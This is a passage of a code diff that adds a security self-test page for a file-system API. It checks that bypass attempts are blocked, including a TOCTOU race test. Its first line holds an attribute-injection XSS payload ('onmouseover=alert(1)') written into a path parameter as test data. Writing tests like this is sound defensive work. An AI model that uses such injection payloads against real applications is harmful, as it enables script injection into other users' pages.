+        'GET', '/api/v1/fs/read?path=' + encodeURIComponent('/tmp/" onmouseover="alert(1)" data-x="')
+      );
+
+      // --- TOCTOU: rapid sequential requests ---
+      // Fire two requests to the same unapproved path simultaneously.
+      // If one gets approved, the other should still require its own approval
+      // (or benefit from the directory-level grant, which is by design).
+
+      {
+        const toctouPath = '/tmp/nexus-toctou-test-' + Date.now();
+        const [r1, r2] = await Promise.all([
+          apiCall('GET', '/api/v1/fs/read?path=' + encodeURIComponent(toctouPath)),
+          apiCall('GET', '/api/v1/fs/read?path=' + encodeURIComponent(toctouPath)),
+        ]);
+        // Both should be denied (path doesn't exist and/or not approved)
+        const bothDenied = !r1.ok && !r2.ok;
+        if (bothDenied) passed++; else failed++;
+        lines.push(`${bothDenied ? '\u2705' : '\u274c'} TOCTOU: concurrent requests to unapproved path`);
+        lines.push(`   \u{1f6e1}\ufe0f Request 1: ${r1.status}, Request 2: ${r2.status} (both should be non-2xx)`);
+        lines.push('');
+      }
+
+      // --- Summary ---
+
+      const total = passed + failed;
+      const allGood = failed === 0;
+      el.className = `result ${allGood ? 'result-success' : 'result-error'}`;
+
+      lines.push('═'.repeat(40));
+      lines.push(`${allGood ? '\u2705' : '\u274c'} ${passed}/${total} tests passed${failed > 0 ? ` (${failed} SECURITY ISSUES FOUND)` : ''}`);
+      if (allGood) {
+        lines.push('\nAll bypass attempts were correctly blocked.');
+      } else {
+        lines.push('\n\u26a0\ufe0f SECURITY ISSUES DETECTED - requests that should have been blocked succeeded!');
+      }
+      el.textContent = lines.join('\n');
+    }
+
+    async function init() {
+      const statusEl = document.getElementById('connection-status');
+      try {
+        const configRes = await fetch('/api/config');
+        config = await configRes.json();
+
+        // Verify connectivity
+        const res = await fetch(`${config.apiUrl}/api/v1/system/info`, {
+          headers: { 'Authorization': `Bearer ${config.token}` }
+        });
+
+        if (res.ok) {
+          statusEl.innerHTML = '<span class="status-connected"><span class="status-dot"></span>Connected</span>';
+        } else {
+          statusEl.innerHTML = '<span class="status-connected" style="background:var(--color-nx-error-muted);color:var(--color-nx-error);"><span class="status-dot" style="background:var(--color-nx-error);"></span>Auth Error</span>';
+        }
+      } catch (e) {
+        statusEl.innerHTML = '<span class="status-connected" style="background:var(--color-nx-error-muted);color:var(--color-nx-error);"><span class="status-dot" style="background:var(--color-nx-error);"></span>Disconnected</span>';
+      }
+    }
+
+    init();
+  </script>
+</body>
+</html>
